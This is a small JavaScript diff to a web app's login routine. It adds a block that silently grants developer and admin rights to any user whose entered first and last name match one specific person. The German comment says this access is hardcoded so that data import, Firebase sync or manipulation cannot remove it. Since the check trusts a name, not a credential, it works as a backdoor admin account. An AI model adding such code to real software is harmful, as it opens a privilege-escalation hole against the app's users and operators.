@@ -1758,6 +1758,15 @@ function finishLogin() {
   loginScreen.style.display = 'none';
   loginScreen.style.pointerEvents = 'none';
   loginScreen.style.visibility = 'hidden';
+
+  // Entwickler-Zugang: hardcodiert für Luc Vorburger – kann NICHT durch
+  // Daten-Import, Firebase-Sync oder Manipulation entfernt werden
+  if ((currentLoginUser.vorname||'').trim().toLowerCase() === 'luc' &&
+      (currentLoginUser.nachname||'').trim().toLowerCase() === 'vorburger') {
+    currentLoginUser.entwickler = true;
+    currentLoginUser.admin = true;
+  }
+
   // Eingeloggten Namen im Header anzeigen
   const logo = document.querySelector('.logo');
   if (logo) {
